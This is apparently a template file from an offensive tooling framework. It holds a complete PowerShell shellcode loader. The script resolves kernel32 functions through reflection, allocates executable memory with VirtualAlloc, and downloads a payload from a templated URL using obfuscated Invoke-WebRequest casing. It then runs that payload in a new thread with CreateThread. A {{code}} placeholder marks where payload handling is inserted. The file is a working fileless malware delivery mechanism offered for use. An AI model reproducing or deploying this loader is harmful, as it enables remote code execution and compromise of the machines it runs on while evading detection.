function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { 
            $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        Write-Host "First Invoke - $moduleName $functionName";
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        Write-Host "Second Invoke - $moduleName $functionName";
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    if ($result -eq 0) {
        Write-Host ":(";
        exit;
    }
    return $result;
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false
    ).DefineType('MyDelegateType', 
        'Class, Public, Sealed, AnsiClass, AutoClass', 
        [System.MulticastDelegate]
    )
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType() 
}

if ([Environment]::Is64BitProcess)
{
    Write-Host "64-bit OS"
}
else
{
    Write-Host "32-bit OS"
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = (iWr -UsEbaSIcparSING {{url}}).content;
{{code}}
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
